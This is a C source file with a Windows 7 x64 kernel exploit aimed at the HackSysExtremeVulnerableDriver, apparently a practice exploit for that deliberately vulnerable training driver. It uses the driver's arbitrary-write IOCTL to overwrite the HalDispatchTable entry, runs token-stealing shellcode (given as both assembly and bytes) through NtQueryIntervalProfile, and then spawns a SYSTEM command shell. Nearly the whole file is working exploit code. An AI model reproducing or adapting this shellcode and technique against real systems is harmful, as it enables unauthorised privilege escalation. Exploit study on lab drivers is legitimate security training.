#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include "../HEVDExploit/helper.h"

#pragma comment(lib,"ntdll.lib")

typedef struct data {
        ULONG64 what;
        ULONG64 where;
}DATA;

typedef DWORD(WINAPI* _NtQueryIntervalProfile)(DWORD, PULONG);

ULONG64 getDrvBase(const char* drvName) {
        NTSTATUS status;
        ULONG i;
        PRTL_PROCESS_MODULES ModuleInfo;

        ModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the module list
        if (!ModuleInfo) {
                printf("VirtualAlloc failed (%d)\n", GetLastError());
                return -1;
        }

        if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, ModuleInfo, 1024 * 1024, NULL))) {
                printf("NtQuerySystemInformation failed(%#x)\n", status);
                VirtualFree(ModuleInfo, 0, MEM_RELEASE);
                return -1;
        }

        ULONG64 drvBase = 0;
        printf("looking for %s ....", drvName);
        for (i = 0; i < ModuleInfo->NumberOfModules; i++) {
                //printf("Image Name  = %s\n", (char *)ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName);
                if (strcmp((const char*)ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName, drvName) == 0) {
                        drvBase = (ULONG64)ModuleInfo->Modules[i].ImageBase;
                        printf("\n%s : Image Base = %p\n", drvName, (PVOID64)drvBase);

                }
        }
        VirtualFree(ModuleInfo, 0, MEM_RELEASE);

        return drvBase;
}

int main() {
        HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
                GENERIC_WRITE, FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0,
                nullptr
        );
        if (hDevice == INVALID_HANDLE_VALUE) {
                return printf("Failed to open device\n");
        }

        /*
        Windows 7 x64 EoP shellcode (stealing token)
        push rbx
        push rcx
        push rdx
        push rdi
        push rsi

        xor eax, eax
        mov rax, gs:[rax + 188h]
        mov rax, [rax + 70h]

        mov rcx, rax
        mov r11, rcx
        and r11, 0x7
        mov rdx, 0x4

        SearchSystemPID:
        mov rax, [rax + 0x188]
        sub rax, 0x188
        cmp[rax + 0x180], rdx
        jne SearchSystemPID

        mov rdx, [rax + 0x208]
        and rdx, 0x0fffffffffffffff0
        or rdx, r11
        mov[rcx + 0x208], rdx

        pop rsi
        pop rdi
        pop rdx
        pop rcx
        pop rbx
        ret
        */

        char EoP[] = "\x53\x51\x52\x57\x56\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\x48\xc7\xc2\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00\x5e\x5f\x5a\x59\x5b\xc3";
        char* shellcode = (char*)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (shellcode == NULL) {
                printf("VirtualAlloc failed\n");
                return -1;
        }

        memcpy(shellcode, EoP, sizeof(EoP));

        ULONG64 ntoskrnl = getDrvBase("ntoskrnl.exe");
        ULONG64 KiServiceTable = ntoskrnl + 0x081300;
        ULONG64 HalDispatchTable = ntoskrnl + 0x001f1c60;

        DATA inp;
        inp.what = (ULONG64)&shellcode;
        inp.where = HalDispatchTable + 0x8;

        _NtQueryIntervalProfile NtQueryIntervalProfile = NULL;
        NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
        if (NtQueryIntervalProfile == NULL) {
                printf("GetProcAddress Failed to get NtQueryIntercalProfile\n");
                return -1;
        }

        PVOID KeGetCurrentThread = GetProcAddress(LoadLibrary(L"ntoskrnl.exe"), "KeGetCurrentThread");
        if (KeGetCurrentThread == NULL) {
                printf("GetProcAddress Failed to get KeGetCurrentThread\n");
                return -1;
        }

        DWORD returned;
        BOOL success = DeviceIoControl(hDevice,
                HEVD_IOCTL_ARBITRARY_WRITE,
                &inp, 0x00,
                nullptr, 0,
                &returned, nullptr
        );

        if (success) {
                printf("Write successful\n");
        }
        else {
                printf("Failed\n");
                return -1;
        }

        PULONG n= (PULONG)VirtualAlloc(NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate memory for the module list
        if (!n) {
                printf("VirtualAlloc failed (%d)\n", GetLastError());
                return -1;
        }
        NtQueryIntervalProfile(2, n);

        WinExec("cmd.exe", 1);

        CloseHandle(hDevice);

        return 0;
}
